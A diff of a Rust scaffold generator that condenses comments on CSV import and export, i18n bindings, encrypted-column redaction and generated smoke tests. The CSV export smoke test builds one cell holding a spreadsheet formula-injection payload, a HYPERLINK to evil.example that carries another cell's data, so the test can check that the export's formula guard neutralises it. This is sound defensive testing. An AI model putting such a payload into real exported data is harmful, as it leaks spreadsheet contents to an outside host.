-    // The exported column names the export's `csv_text_cell` formula guard
-    // applies to. The import has to undo that guard on exactly those columns or
-    // a file this app exported would gain an apostrophe per round trip — and on
-    // no others, or it would strip a leading apostrophe the export never added.
-    // Empty means no guarded column, and then no inverse is emitted at all: an
-    // unused `fn` is a `dead_code` warning in the user's app.
+    // Columns the export's `csv_text_cell` formula guard covers. The import undoes the guard on
+    // exactly these, so a round trip neither adds nor strips an apostrophe. Empty emits no
+    // inverse: an unused `fn` warns in the user's app.
     text_columns: &[&str],
-    // Columns the EXPORT writes but the form does not carry, so an import can
-    // never set them: `id` and `created_at` (the database assigns them), a
-    // `--default`ed column (dropped from the form, set by the SQL DEFAULT), a
-    // `position` column (assigned by the reorder triggers) and an `Attachment`
-    // (a storage key in a cell is not a file). They are silently ignored on the
-    // way in, so the upload page names them rather than letting an operator edit
-    // one and watch nothing happen.
+    // Columns the export writes but the form cannot set (`id`, `created_at`, a `--default`ed
+    // column, `position`, an `Attachment`). The upload page names them so an operator does not
+    // edit one and see nothing happen.
     ignored_columns: &[&str],
-    // Every exported column `{Pascal}Form` can set, as of generation. The
-    // required header set is the LIVE `csv_columns()` intersected with this
-    // (issue #2331), so a column later dropped from the export stops being
-    // required, and an export-only computed column later added to it never
-    // becomes required.
+    // Every exported column `{Pascal}Form` can set at generation time. The required header set
+    // is the live `csv_columns()` intersected with this (#2331).
     settable_columns: &[&str],
-    // The boolean columns, paired with whether a BLANK cell means `false` for
-    // them (true for a non-nullable column, false for a nullable one). A
-    // spreadsheet writes `TRUE`/`1`/`yes`/blank where serde's `bool` accepts
-    // only `true`/`false`, so without this every such spelling fails the whole
-    // row on a column the form itself treats as optional.
+    // Boolean columns, each with whether a blank cell means `false` (non-nullable). Spreadsheets
+    // write `TRUE`/`1`/`yes`/blank, which serde's `bool` rejects.
     bool_columns: &[(&str, bool)],
     labels: &scaffold_i18n::ViewLabels,
 ) -> String {
-    // Issue #1349: the two view helpers take the locale by reference (they only
-    // forward it into `t!`), the handlers take the extractor by value — the same
-    // split the attachment read-back helpers use. All three are empty without
-    // the flag, keeping every signature byte-identical.
+    // The view helpers take the locale by reference (they only forward it to `t!`); the
+    // handlers take the extractor by value (#1349). All three are empty without `--i18n`.
     let (locale_param, locale_ref_param, locale_arg) = if labels.enabled() {
         (
             "locale: Locale,\n    ",
@@ -11342,57 +9746,27 @@ fn render_csv_import_section(
     } else {
         ("", "", "")
     };
-    // "Import {Pascal}s" is a per-resource key for the same reason "New
-    // {Pascal}" is (see `new_link_markup`): a translator cannot agree an article
-    // or adjective with a noun passed in as an argument.
+    // A per-resource key, like "New {Pascal}": a translator cannot agree an article or
+    // adjective with a noun passed in as an argument.
     let import_key = format!("{snake_name}.import");
     let import_english = format!("Import {pascal_name}s");
-    // The error messages are `String` in BOTH modes — `t!` yields an owned
-    // String and the plain path an owned literal — so the `Option<String>` the
-    // handler binds has one type either way.
+    // Owned `String` in both modes, so the handler's `Option<String>` has one type.
     let not_csv_english = "That file is not a .csv - choose a CSV file and try again.";
     let no_file_english = "Choose a CSV file to import.";
-    // The two per-column cell rules, each emitted only when some column needs it: an
-    // unused `fn` is a `dead_code` warning in the user's app. `cell_call` composes
-    // whichever apply, innermost first, so a text column that is also boolean — there is
-    // no such column today, but the composition costs nothing — would go through both.
-    // With neither, the value passes through exactly as before either helper existed.
-    //
-    // The ignored columns are named on the page, not just in a doc comment. They are in
-    // the header the export writes and in the list printed above it, but the form does not
-    // carry them, so without this line an operator could edit one in a spreadsheet,
-    // re-upload, and watch nothing happen with no error and no row in the report.
-    //
-    // `discarded_columns` is the subset whose presence in a file is genuinely surprising.
-    // `id` and `created_at` are assigned by the database and appear in every exported
-    // file, so flagging those would fire on every ordinary round trip. A `--default`ed
-    // column, a `position` column, or an `Attachment` is a column an operator can edit in a
-    // spreadsheet and watch silently do nothing — that is what the report warns about.
+    // Ignored columns worth a warning when a file carries them. `id` and `created_at` are in
+    // every exported file, so flagging them would fire on every round trip.
     let discarded_columns: Vec<&str> = ignored_columns
         .iter()
         .copied()
         .filter(|name| *name != "id" && *name != "created_at")
         .collect();
-    // A model with no droppable column emits none of this: no const, no probe, no markup —
-    // and the local and the view's parameter lose their `mut` and gain a leading
-    // underscore, because an unused binding is a warning in the user's app and the
-    // scaffold's contract is that generated code compiles clean.
+    // The required header set is derived at request time (#2331): `csv_required_columns()`
+    // subtracts what the import cannot set from the live `csv_columns()`, so a column dropped
+    // from the export never leaves a stale requirement.
     //
-    // Issue #2331: the required set is DERIVED, not baked.
-    // `csv_required_columns()` subtracts the columns the import cannot set from
-    // the live `CsvSchema::csv_columns()` at request time, so dropping a column
-    // from the export's schema can never leave a stale requirement behind that
-    // rejects this app's own export. Emitted unconditionally: with nothing
-    // settable the check finds no missing columns, and the fn is always called,
-    // so the scaffold's compiles-clean contract holds either way.
-    //
-    // Without this check a file that shares no column names with the model
-    // still imports — `decode_form` ignores headers it does not know, and a form
-    // whose every field can be defaulted (an unchecked checkbox's `bool`, an optional
-    // column) then decodes an unrelated row into a blank record. `junk\nx` would preview as
-    // "1 row would insert" and commit a row of defaults. Comparing the header up front
-    // makes that one file-level refusal, which is what it is: the operator picked the wrong
-    // file.
+    // Without the header check, a file sharing no column names with the model still imports:
+    // `decode_form` ignores unknown headers, and a form whose fields all default decodes each
+    // row into a blank record. Refuse the wrong file up front instead.
     let settable_names = settable_columns
         .iter()
         .map(|name| format!("\"{name}\""))
@@ -11417,6 +9791,8 @@ fn render_csv_import_section(
         "",
     ]
     .join("\n");
+    // With no discarded column, emit no const, probe or markup, and underscore the unused
+    // binding so the generated app compiles warning-free.
     let (discarded_mut, discarded_param) = if discarded_columns.is_empty() {
         ("", "_discarded_seen")
     } else {
@@ -11430,10 +9806,9 @@ fn render_csv_import_section(
             .map(|name| format!("\"{name}\""))
             .collect::<Vec<_>>()
             .join(", ");
-        // Recorded in this branch for the same reason as the ignored-columns
-        // label below: `ViewLabels` records a key the moment it is asked for, so
-        // a key looked up for markup this model does not emit would land in
-        // `i18n/en.ftl` unreferenced — what `autumn i18n check --strict` fails on.
+        // Looked up only in this branch: `ViewLabels` records a key when asked, and a key for
+        // markup this model does not emit is left unreferenced in `i18n/en.ftl`, which
+        // `autumn i18n check --strict` rejects.
         let discarded_label = labels.markup(
             "common.import.columns.discarded",
             "This file carries values for columns the import cannot set, and they were ignored",
@@ -11485,10 +9860,7 @@ fn render_csv_import_section(
             .map(|name| format!("\"{name}\""))
             .collect::<Vec<_>>()
             .join(", ");
-        // Recorded in this branch, not in the `.replace(…)` chain below:
-        // `ViewLabels` records a key the moment it is asked for, so looking one
-        // up for markup this model does not emit would leave an unreferenced key
-        // in `i18n/en.ftl` — exactly what `autumn i18n check --strict` fails on.
+        // Looked up only in this branch, like the discarded-columns label above.
         let ignored_label = labels.markup(
             "common.import.columns.ignored",
             "Columns in the file that this import cannot set",
@@ -11513,10 +9885,8 @@ fn render_csv_import_section(
             .join("\n"),
         )
     };
-    // Which cell rules this model needs, and the expression that applies them.
-    // Each helper is emitted only where some column needs it: an unused `fn` is
-    // a `dead_code` warning in the user's app, and the scaffold's contract is
-    // that generated code compiles clean.
+    // Each helper is emitted only where a column needs it: an unused `fn` is a `dead_code`
+    // warning in the user's app.
     let cell_call = match (!text_columns.is_empty(), !bool_columns.is_empty()) {
         (true, true) => "csv_bool_cell(key, csv_unguard_cell(key, value))",
         (true, false) => "csv_unguard_cell(key, value)",
@@ -11763,8 +10133,7 @@ const fn field_is_sortable(field: &Field, backend: DatabaseBackend) -> bool {
               header/cell emission the four surfaces must agree on"
 )]
 fn render_columns_vec(
-    // Decides whether a `decimal` column may advertise a sortable header
-    // (issue #1924) — see `field_is_sortable`.
+    // Decides whether a `decimal` column may advertise a sortable header (#1924).
     backend: DatabaseBackend,
     pascal_name: &str,
     snake_name: &str,
@@ -11772,23 +10141,16 @@ fn render_columns_vec(
     reference_displays: &BTreeMap<String, ReferenceDisplay>,
     use_label_maps: bool,
     route_key_field: Option<&str>,
-    // Whether the emitted columns advertise themselves as sortable. `true` for
-    // the flat index, whose handler extracts a `ListQuery` and actually honours
-    // `?sort=&dir=`. `false` for the nested child list (issue #1323), which runs
-    // a fixed `ORDER BY id DESC`: a sortable header there renders a link that
-    // reloads the identical list and stamps an `aria-sort` that never changes —
-    // an accessibility lie, not just a dead control.
+    // `true` for the flat index, which honours `?sort=&dir=`. `false` for the nested child list
+    // (#1323): its order is a fixed `ORDER BY id DESC`, so a sortable header would be a dead
+    // link with an `aria-sort` that never changes.
     sortable: bool,
-    // Issue #1349: with `--i18n`, each header becomes a `let`-bound `t!` lookup
-    // rather than an inline literal — `Column::new` borrows its header for the
-    // column's lifetime, so a `&t!(…)` temporary inside the `vec![…]` would be
-    // dropped before the table renders.
+    // With `--i18n` (#1349) each header is a `let`-bound `t!` lookup emitted first:
+    // `Column::new` borrows it, so a `&t!(…)` temporary inside `vec![…]` would drop too early.
     labels: &scaffold_i18n::ViewLabels,
 ) -> String {
     use std::fmt::Write as _;
     let mut out = String::with_capacity(fields.len() * 150 + 300);
-    // Header bindings first: `Column::new` takes `&'a str`, so a translated
-    // header has to outlive the `vec![…]` it is built into.
     if labels.enabled() {
         let _ = writeln!(
             out,
@@ -11808,7 +10170,6 @@ fn render_columns_vec(
         out,
         "    let columns: Vec<autumn_web::widgets::Column<{pascal_name}>> = vec!["
     );
-    // ID column — always sortable (the default order is `id DESC`).
     let id_sortable = if sortable { ".sortable(\"id\")" } else { "" };
     let id_header = if labels.enabled() {
         "&l_col_id".to_owned()
@@ -11819,7 +10180,6 @@ fn render_columns_vec(
         out,
         "        autumn_web::widgets::Column::new({id_header}, |row: &{pascal_name}| maud::html! {{ (row.id) }}){id_sortable},"
     );
-    // One column per field
     for f in fields {
         let header = if labels.enabled() {
             format!("&l_col_{}", f.name)
@@ -11831,10 +10191,8 @@ fn render_columns_vec(
         } else {
             String::new()
         };
-        // A displayable `references` column renders the parent's label from
-        // the per-view `{name}_labels` map the handler loaded (issue #1146),
-        // instead of the raw foreign-key id. The closure borrows the map,
-        // which outlives the `columns` vec in the generated handler.
+        // A displayable reference renders the parent's label from the handler's `{name}_labels`
+        // map (#1146), not the raw id.
         let cell_expr = if use_label_maps
             && f.kind.is_reference()
             && reference_displays.contains_key(&f.name)
@@ -11852,16 +10210,10 @@ fn render_columns_vec(
         } else {
             cell_value_expr(f)
         };
-        // Issue #1340: an at-rest encrypted column renders a redaction marker in
-        // a LIST cell, never the decrypted value. A list is a bulk-disclosure
-        // surface — one page shows every row's secret at once, to everyone the
-        // index is authorized for, and ends up in screenshots, printouts, and
-        // page caches. The single-record `show` view and the `edit` form still
-        // render the real value: the reader routed there deliberately, for one
-        // record, and a form has to show what it is editing. That split mirrors
-        // the admin panel's own `.encrypted()` / `.encrypted_visible()`. The
-        // closure binds `_row` because the cell ignores it, keeping the
-        // generated app warning-free.
+        // An encrypted column shows a redaction marker in list cells (#1340): a list discloses
+        // every row's secret at once. The show view and edit form still render the real value,
+        // as the admin's `.encrypted()` / `.encrypted_visible()` split does. `_row` because the
+        // cell ignores it.
         let (binding, cell_expr) = if f.is_encrypted() {
             ("_row", "\"••••••••\"".to_owned())
         } else {
@@ -11872,9 +10224,8 @@ fn render_columns_vec(
             "        autumn_web::widgets::Column::new({header}, |{binding}: &{pascal_name}| maud::html! {{ ({cell_expr}) }}){sortable_suffix},"
         );
     }
-    // Show link column. Keyed off the slug (issue #1260) when the model has
-    // one, matching `paths::show`'s rekeyed `Path<String>` route; a non-slug
-    // model keeps the pre-#1260 `row.id` byte-for-byte.
+    // Show link column, keyed off the slug when the model has one (#1260), matching
+    // `paths::show`'s `Path<String>` route.
     let show_link_arg =
         route_key_field.map_or_else(|| "row.id".to_owned(), |field| format!("&row.{field}"));
     let _ = writeln!(
@@ -11896,10 +10247,8 @@ fn render_columns_vec(
 fn render_show_property_rows(
     fields: &[Field],
     reference_displays: &BTreeMap<String, ReferenceDisplay>,
-    // Issue #1349: `property_list` takes `&[(&str, Markup)]`, so a translated
-    // label is a `let` binding (see [`render_show_property_label_binds`]) rather
-    // than an inline `t!` call whose `String` would be dropped with the `vec![…]`
-    // temporary.
+    // With `--i18n` (#1349) a label is a `let` binding (see `render_show_property_label_binds`):
+    // `property_list` borrows `&str`, so an inline `t!` `String` would drop with the `vec![…]`.
     labels: &scaffold_i18n::ViewLabels,
 ) -> String {
     use std::fmt::Write as _;
@@ -11911,9 +10260,8 @@ fn render_show_property_rows(
     };
     let _ = writeln!(out, "        ({id_label}, maud::html! {{ (row.id) }}),");
     for f in fields {
-        // One key per field, shared with the index header and the form control.
-        // The English is the derive's Title Case rather than this view's older
-        // sentence case, so all three surfaces read alike once translated.
+        // One key per field, shared with the index header and the form control, so the English
+        // is Title Case like theirs.
         let label = if labels.enabled() {
             format!("&l_prop_{}", f.name)
         } else {
@@ -11922,24 +10270,19 @@ fn render_show_property_rows(
         let cell_expr = if f.kind.is_reference() && reference_displays.contains_key(&f.name) {
             format!("{}_label", f.name)
         } else if f.kind.is_attachment() {
-            // Issue #1236: the detail page renders the file the record actually
-            // references — a download link through the signed URL the handler
-            // resolved into `{name}_url` — instead of the index's cheap
-            // presence marker. See `attachment_link` in the generated routes.
+            // A download link through the signed URL the handler resolved into `{name}_url`
+            // (#1236), not the index's presence marker.
             let name = &f.name;
-            // The locale argument matches `attachment_link`'s `--i18n` signature
-            // (see `render_routes_file`): the meta span it renders is bundle
-            // text, and this handler holds the extractor.
+            // Matches `attachment_link`'s `--i18n` signature: the meta span it renders is bundle
+            // text.
             let locale_arg = if labels.enabled() { "&locale, " } else { "" };
             format!(
                 "attachment_link({locale_arg}row.{name}.as_ref(), {name}_url.as_deref(), \"{name}\")"
             )
         } else if f.kind.is_rich_text() {
-            // Issue #1255: the column stores user-submitted Markdown SOURCE, so
-            // the show page renders it through `render_user_content` — raw-HTML
-            // passthrough disabled, output run through an allowlist sanitizer.
-            // This is the one place the scaffold emits pre-escaped markup from a
-            // user-controlled column, and it is exactly why that helper exists.
+            // The Markdown source is user-submitted, so it renders through `render_user_content`
+            // (raw HTML off, output sanitized) (#1255). This is the scaffold's only pre-escaped
+            // markup from a user-controlled column.
             let name = &f.name;
             if f.nullable {
                 format!(
@@ -12102,9 +10445,8 @@ fn render_show_reference_label_loads(
         };
         let name = &f.name;
         let column = &display.column;
-        // A nullable display column comes back as `Option<String>` and is
-        // flattened; a non-null one as `String`. Both coalesce to the id on a
-        // miss so the show page never renders a bare blank for a real FK.
+        // Both forms fall back to the id on a miss, so the show page never renders a blank for a
+        // real FK.
         let found_expr = if display.column_nullable {
             format!(
                 "{table}::table.find(fk).select({table}::{column}).first::<Option<String>>(&mut *db).await.ok().flatten().unwrap_or_else(|| fk.to_string())"
@@ -12344,16 +10686,9 @@ fn render_nullable_field_match(fields: &[Field]) -> String {
 /// by pre-allocating capacity and utilizing `std::fmt::Write` sequentially.
 fn render_update_columns(plural: &str, fields: &[Field]) -> String {
     use std::fmt::Write;
-    // Estimate 50 chars per field
     let mut out = String::with_capacity(fields.len() * 50);
-    // Issue #1326: a `:states(…)` state-machine column is transition-only — it is
-    // mutated exclusively through the dedicated `POST /{plural}/{{id}}/transitions/
-    // {field}` handler (a direct `diesel::update(...).set({field}.eq(new_state))`),
-    // never the ordinary update path. Excluding it from the update `.set((…))`
-    // tuple (and, in `render_form_for_helper`, from the edit form) stops a plain
-    // `POST /{plural}/{{id}}/update` from setting `status=<anything>` and bypassing
-    // `transition_{field}_to` / its guards. A model with no state-machine field
-    // emits the exact pre-#1326 column set.
+    // A state-machine column changes only through its transition handler (#1326), so it is left
+    // out of the update tuple; otherwise a plain update could set any state and skip the guards.
     for (i, f) in fields
         .iter()
         .filter(|f| f.state_machine.is_none())
@@ -12362,15 +10697,9 @@ fn render_update_columns(plural: &str, fields: &[Field]) -> String {
         if i > 0 {
             out.push_str(", ");
         }
-        // Issue #1340: this `.set((…))` tuple is a RAW diesel write — it does
-        // not go through `New{Model}`/`Update{Model}`, so it never sees the
-        // `#[diesel(serialize_as = …)]` wrapper the `#[model]` macro attaches to
-        // an `#[encrypted]` field. Binding the bare `String` here would store
-        // PLAINTEXT in a column the reader then tries to decrypt: a silent leak
-        // of exactly the data the annotation exists to protect, plus a
-        // `MalformedEnvelope` error on the very next read. Bind through the same
-        // wrapper type instead, so the update path encrypts identically to the
-        // insert path.
+        // This `.set((…))` is a raw diesel write that skips the `serialize_as` wrapper `#[model]`
+        // puts on an `#[encrypted]` field (#1340). Bind through the same wrapper, or the column
+        // stores plaintext and the next read fails with `MalformedEnvelope`.
         match f.encrypted_mode() {
             Some(mode) => write!(
                 out,
@@ -12379,10 +10708,8 @@ fn render_update_columns(plural: &str, fields: &[Field]) -> String {
                 wrapper = encryption_wrapper_type(mode),
             ),
             None if is_copy_field_kind(f) => {
-                // `clippy::clone_on_copy`: `new` is only ever a shared
-                // reference here, but a `Copy` field (`bool`, `i32`, …) can be
-                // read out of it directly — `.clone()` would just be a
-                // same-cost copy through a different name.
+                // A `Copy` field reads straight out of the reference; `.clone()` would trip
+                // `clippy::clone_on_copy`.
                 write!(out, "{plural}::{name}.eq(new.{name})", name = f.name)
             }
             None => write!(
@@ -12628,12 +10955,9 @@ fn render_api_smoke_test(
     let ignore_attr = smoke_ignore_attr(backend);
     let run_note = smoke_run_note(backend);
     let id_to_text = smoke_id_to_text(backend);
-    // Route the seed through `render_execute_sql_calls` so a multi-statement
-    // seed (the no-required-column branch emits one `INSERT ... DEFAULT VALUES`
-    // per row) becomes one `db.execute_sql(...)` call apiece -- diesel-async's
-    // `execute` uses the extended protocol, which rejects several `;`-separated
-    // statements in a single call. The single-statement required-column branch
-    // is unaffected (it renders exactly one call).
+    // One `execute_sql` call per statement: the no-required-column seed emits one
+    // `INSERT ... DEFAULT VALUES` per row, and diesel-async's extended protocol rejects several
+    // `;`-separated statements in one call.
     let seed_calls = render_execute_sql_calls(
         backend,
         &render_api_seed_sql(backend, plural, fields, defaults),
@@ -12764,19 +11088,12 @@ fn render_reference_stub_tables_sql(
                 "CREATE TABLE IF NOT EXISTS {target} (id {});",
                 IdType::BigSerial.pk_sql_for(backend)
             );
-            // Seed two rows — ids 1 and 2, since BIGSERIAL starts there — so a NOT
-            // NULL `references` column pointing at this stub has a real id to
-            // reference. Without at least one row, any raw INSERT the smoke test
-            // issues against the table under test, such as the enum out-of-set
-            // rejection test's deliberately invalid INSERT (see
-            // `enum_rejection_insert_sql`), would fail on this FK constraint
-            // whatever column it was exercising, masking the real assertion behind
-            // an unrelated failure. The second row exists for
-            // `unique_sample_literal_variant`: a non-target `unique references`
-            // column in `unique_violation_insert_sql`'s duplicate insert needs a
-            // second real id, distinct from the target's own value, or it would
-            // collide with itself across the two inserts the way the target column
-            // is meant to.
+            // Seed ids 1 and 2 so a NOT NULL `references` column has real ids to point at.
+            // Without a row, a raw INSERT in the smoke test (such as
+            // `enum_rejection_insert_sql`'s) fails on this FK instead of on the column it
+            // tests. The second id lets a non-target `unique references` column take a
+            // distinct value in `unique_violation_insert_sql`'s duplicate insert, so only
+            // the target column collides.
             let _ = writeln!(
                 out,
                 "INSERT INTO {target} DEFAULT VALUES;\nINSERT INTO {target} DEFAULT VALUES;"
@@ -12796,10 +11113,8 @@ fn render_reference_stub_tables_sql(
 /// also gets a stub target table created first — see
 /// [`render_reference_stub_tables_sql`].
 #[allow(clippy::too_many_arguments)]
-// Each bool is one independently-gated generated test section, all of them
-// already computed by the caller — folding them into an options struct would
-// move the same flags one level out without removing a single call-site
-// decision.
+// Each bool gates one generated test section and is computed by the caller; an options struct
+// would only move the same flags one level out.
 #[allow(clippy::fn_params_excessive_bools)]
 fn render_smoke_test(
     backend: DatabaseBackend,
@@ -12863,51 +11178,38 @@ fn render_smoke_test(
         )
     };
 
-    // Issue #1124: prove the changeset round-trip on a real request — a
-    // rejected submission gets 422 with the other field preserved and an
-    // inline error, not a 400 dead-end. HTML scaffolds only; the `--api` JSON
-    // path is out of scope (Problem Details already covers it, issue #598).
+    // #1124: a rejected submission re-renders at 422 with input preserved and an inline
+    // error. HTML only: `--api` errors are Problem Details (#598).
     let base = if !api && !validations.is_empty() {
         base + &render_validation_rejection_smoke_test(plural, validations)
     } else {
         base
     };
 
-    // Issue #1127: exercise the full write path (create / update / delete +
-    // validation-failure re-render) in-process. HTML scaffolds only — the
-    // `--api` JSON resource tests are out of scope (folded into issue #1028).
-    // Always emitted for HTML scaffolds (even without declared `--validate`
-    // rules): the stand-in carries its own validated field, so a bare
-    // `generate scaffold Post` still gets create/update/delete coverage.
+    // #1127: create / update / delete and the validation re-render, HTML only (`--api`: #1028).
+    // Emitted even without `--validate` rules: the stand-in carries its own validated field.
     let base = if api {
         base
     } else {
         base + &render_write_path_smoke_test(pascal_name, plural, bulk_delete)
     };
 
-    // Issue #1318 (AC6): a scaffold that opted into optimistic locking gets a
-    // dedicated stale-write test — the one behavior a reader would otherwise
-    // have to take on trust, and the one a later refactor is most likely to
-    // silently drop.
+    // #1318: optimistic locking gets a stale-write test.
     let base = if !api && super::model::lock_version_field(fields).is_some() {
         base + &render_optimistic_lock_smoke_test(plural)
     } else {
         base
     };
 
-    // Issue #1236 (AC6): attachment scaffolds additionally get a multipart
-    // write-path test that drives a zero-JS `multipart/form-data` create through
-    // the real `Multipart` extractor, streams the uploaded file to a real
-    // `LocalBlobStore`, persists the returned `Blob` in a real Postgres row, and
-    // asserts the persisted attachment column bound a non-empty blob key.
+    // #1236: attachment scaffolds get a multipart create test through the real `Multipart`
+    // extractor, `LocalBlobStore` and a Postgres row.
     let base = if !api && has_attachment_fields(fields) {
         base + &render_attachment_multipart_write_path_smoke_test(pascal_name, plural, fields)
     } else {
         base
     };
 
-    // Issue #1125 (AC4/AC6): when the scaffold authorizes its mutating handlers
-    // (owner column, standard path), also emit a cross-user 403 demonstration.
+    // #1125: authorized mutating handlers get a cross-user 403 test.
     if authorize {
         base + &render_cross_user_forbidden_smoke_test(plural)
     } else {
@@ -12949,14 +11251,9 @@ fn invalid_value_violating_rule(rule: &str) -> Option<String> {
         return match (min, max) {
             // A `min` bound is violated by submitting nothing at all.
             (Some(min), _) if min > 0 => Some(String::new()),
-            // A `max`-only bound is violated by exceeding it by one character
-            // — a fixed-size literal (e.g. 1000 `x`s) would itself satisfy a
-            // looser `max` (say 2000), silently turning the "invalid"
-            // submission valid and failing the smoke test's own 422 premise.
+            // Exceed `max` by exactly one: a fixed-size literal could satisfy a looser `max`.
             (_, Some(max)) => Some("x".repeat(usize::try_from(max + 1).unwrap_or(usize::MAX))),
-            // No `max`, and `min` is either absent or 0 — every string
-            // (including blank) satisfies this rule; there is nothing to
-            // violate.
+            // No `max` and `min` absent or 0: every string, blank included, passes.
             _ => None,
         };
     }
@@ -13056,13 +11353,9 @@ fn render_validation_rejection_smoke_test(
     plural: &str,
     validations: &BTreeMap<String, Vec<String>>,
 ) -> String {
-    // Pick the first validated field whose declared rule actually has a
-    // violating value: a no-op rule (e.g. `length:min=0` with no `max`
-    // accepts every string, including blank) or one whose bound exceeds
-    // `MAX_GENERATED_VALIDATION_SAMPLE_LEN` (see that constant's doc comment)
-    // can't build a real "rejected" submission, so it's skipped in favor of
-    // another validated field rather than asserting a 422 the real server
-    // would never return.
+    // Use the first validated field whose rule can be violated: a no-op rule (`length:min=0`,
+    // no `max`) or a bound over `MAX_GENERATED_VALIDATION_SAMPLE_LEN` cannot yield a
+    // submission the server would reject with 422.
     let Some((target_name, rule, invalid_value)) = validations.iter().find_map(|(name, rules)| {
         let rule = rules.first().cloned().unwrap_or_default();
         if length_bound_exceeds_sample_cap(&rule) {
@@ -13312,8 +11605,7 @@ async fn __PLURAL___nested_under_parent() {
 #[allow(clippy::too_many_lines)] // the emitted test body is one raw-string template
 fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
     use std::fmt::Write as _;
-    // The header row `export_csv` writes: `id` plus the model's own columns, in
-    // the same order the generated `CsvSchema::csv_columns` lists them.
+    // `id` plus the model's columns, in the generated `CsvSchema::csv_columns` order.
     let mut columns = String::from("\"id\"");
     let mut header_row = String::from("id");
     // `created_at` closes the list, matching `render_csv_schema_impl`.
@@ -13326,11 +11618,9 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
         let _ = write!(columns, ", \"{name}\"");
         let _ = write!(header_row, ",{name}");
     }
-    // Three rows, each isolating one rule. Every cell is an `Option<String>` so
-    // `None` genuinely models a NULL column: if the emitted expression were a
-    // debug format instead of `unwrap_or_default()`, the `None` assertion below
-    // would fire. Rows 2 and 3 put the interesting value in the FIRST cell and
-    // leave the rest NULL.
+    // Three rows, one rule each. Cells are `Option<String>` so a NULL column is a real `None`:
+    // a debug format in place of `unwrap_or_default()` would print `None` and fail the test.
+    // Rows 2 and 3 set only the first cell.
     let cells = |first: &str| -> String {
         let mut out = String::new();
         for (i, _) in names.iter().enumerate() {
@@ -13352,7 +11642,7 @@ fn render_csv_export_smoke_test(plural: &str, fields: &[Field]) -> String {
         .join(", ");
     // `a,b "q"` + a newline: every character RFC 4180 has a rule for.
     let quoting_cells = cells("Some(\"a,b \\\"q\\\"\\nz\".to_owned())");
-    // The classic exfiltration payload a colleague's spreadsheet would execute.
+    // A formula-injection payload a spreadsheet would execute.
     let formula_cells = cells(
         "Some(\"=HYPERLINK(\\\"https://evil.example/?d=\\\"&A2,\\\"quarterly report\\\")\".to_owned())",
     );
@@ -13998,9 +12288,8 @@ async fn __PLURAL___write_path_crud() {
         .assert_body_contains("0 row(s)");__BULK_STEPS__
 }
 "#;
-    // Issue #1312: the bulk delete-selected stand-in. Mirrors the generated
-    // handler's contract — repeated `ids` checkboxes, 303 back to the index, and
-    // an empty selection that is a no-op rather than a 400.
+    // #1312: bulk delete-selected stand-in. Repeated `ids`, 303 to the index, and an empty
+    // selection is a no-op rather than a 400.
     const BULK_HANDLER: &str = r#"
 
     // Issue #1312: the index list's bulk form posts the checked rows here as
@@ -14615,8 +12904,7 @@ async fn __PLURAL___multipart_create_without_file_is_null() {
         .iter()
         .find(|f| f.kind.is_attachment())
         .map_or("attachment", |f| f.name.as_str());
-    // A sibling non-attachment field name for a realistic mixed multipart body
-    // (a text part alongside the file part); the stand-in handler ignores it.
+    // A text part sent beside the file part; the stand-in handler ignores it.
     let text_field = fields
         .iter()
         .find(|f| !f.kind.is_attachment())
@@ -14762,23 +13050,15 @@ async fn __PLURAL___cross_user_mutations_are_forbidden() {
 fn sql_sample_literal(backend: DatabaseBackend, kind: FieldKind) -> String {
     let sqlite = backend == DatabaseBackend::Sqlite;
     match kind {
-        // `Enum`'s "'sample'" here is never actually used: `enum_rejection_insert_sql`
-        // special-cases every enum column (the field under test gets the
-        // deliberately out-of-set literal; any *other* required enum column
-        // gets one of its own real variants instead — see that function).
+        // `enum_rejection_insert_sql` picks every enum column's value itself, so `Enum`
+        // never uses this `'sample'`.
         FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Enum => {
             "'sample'".to_owned()
         }
-        // A unique sample literal, not `'sample'` — this helper fills every
-        // *other* `NOT NULL` column while testing one column in isolation, and
-        // a slug field's own `UNIQUE INDEX` would reject a second `'sample'`
-        // row alongside whatever `enum_rejection_insert_sql` inserts.
+        // Not `'sample'`: a slug column carries a `UNIQUE INDEX` (#1260), so it gets its own
+        // slug-shaped literal.
         FieldKind::Slug => "'sample-slug'".to_owned(),
-        // `position` (issue #1358) is a plain `BIGINT NOT NULL` column like
-        // any other `i64`-shaped field — "1" satisfies it fine for a smoke
-        // test that isn't exercising the ordering invariant itself.
-        // `commentable` (issue #1367) is likewise a plain `BIGINT NOT NULL`
-        // counter column at the storage level.
+        // `position` (#1358) and `commentable` (#1367) are plain `BIGINT NOT NULL` columns.
         FieldKind::I32
         | FieldKind::I64
         | FieldKind::References
@@ -14786,21 +13066,18 @@ fn sql_sample_literal(backend: DatabaseBackend, kind: FieldKind) -> String {
         | FieldKind::Commentable => "1".to_owned(),
         FieldKind::Bool => "TRUE".to_owned(),
         FieldKind::F32 | FieldKind::F64 => "1.0".to_owned(),
-        // Scale-derived rather than a fixed "1.0": a tightly-scaled column
-        // like `decimal{1,1}` (valid range `(-1,1)`) would reject a literal
-        // "1.0" with a numeric field overflow — see `decimal_literal_at_scale`.
+        // Scale-derived: `decimal{1,1}` (range `(-1,1)`) overflows on a literal "1.0".
         FieldKind::Decimal { scale, .. } => decimal_literal_at_scale(scale, 1),
         FieldKind::Uuid if sqlite => format!("({})", super::dsl::SQLITE_UUID_V4_SQL),
         FieldKind::Uuid => "gen_random_uuid()".to_owned(),
         FieldKind::NaiveDateTime | FieldKind::DateTime if sqlite => "CURRENT_TIMESTAMP".to_owned(),
         FieldKind::NaiveDateTime | FieldKind::DateTime => "NOW()".to_owned(),
-        // A `TIME` column (issue #3405). Postgres casts the literal; SQLite
-        // stores it as text, which diesel reads back as a `NaiveTime`.
+        // #3405: Postgres casts the literal; SQLite stores it as text, which diesel reads
+        // back as a `NaiveTime`.
         FieldKind::Time => "'09:30:00'".to_owned(),
         FieldKind::Bytea if sqlite => "X'00'".to_owned(),
         FieldKind::Bytea => "'\\x00'::bytea".to_owned(),
-        // Always nullable (see `FieldKind::Attachment`'s doc comment), so it
-        // never needs a sample literal to satisfy a `NOT NULL` constraint.
+        // Always nullable (see `FieldKind::Attachment`).
         FieldKind::Attachment => "NULL".to_owned(),
         FieldKind::Json if sqlite => "'{}'".to_owned(),
         FieldKind::Json => "'{}'::jsonb".to_owned(),
@@ -14831,8 +13108,7 @@ const API_SMOKE_TEST_SEED_ROWS: usize = 25;
 fn sql_seed_value_expr(backend: DatabaseBackend, f: &Field) -> String {
